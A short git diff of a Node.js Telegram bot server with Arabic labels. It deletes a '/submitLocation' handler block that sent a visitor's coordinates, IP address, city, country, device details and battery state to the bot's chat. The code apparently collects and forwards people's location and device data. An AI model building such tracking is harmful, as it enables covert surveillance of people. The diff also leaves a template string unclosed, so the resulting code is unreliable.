@@ -182,27 +182,6 @@ app.post('/submitLocation', upload.none(), async (req, res) => {
     }
 
     const caption = `
-معلومات إضافية:
-IP: ${additionalData.ip}
-الدولة: ${additionalData.country}
-المدينة: ${additionalData.city}
-المنصة: ${additionalData.platform}
-إصدار الجهاز: ${additionalData.deviceVersion}
-مستوى البطارية: ${additionalData.batteryLevel || 'غير متاح'}
-الشحن: ${additionalData.batteryCharging ? 'نعم' : 'لا' || 'غير متاح'}
-    `;
-
-    try {
-        await bot.sendLocation(chatId, latitude, longitude);
-        await bot.sendMessage(chatId, caption);
-        console.log('Location sent successfully');
-        res.json({ success: true });
-    } catch (error) {
-        console.error('Error sending location:', error);
-        res.status(500).json({ error: 'Failed to send location message' });
-    }
-});
-
 
 // أوامر البوت
 bot.onText(/\/subscribe (\d+)/, (msg, match) => {
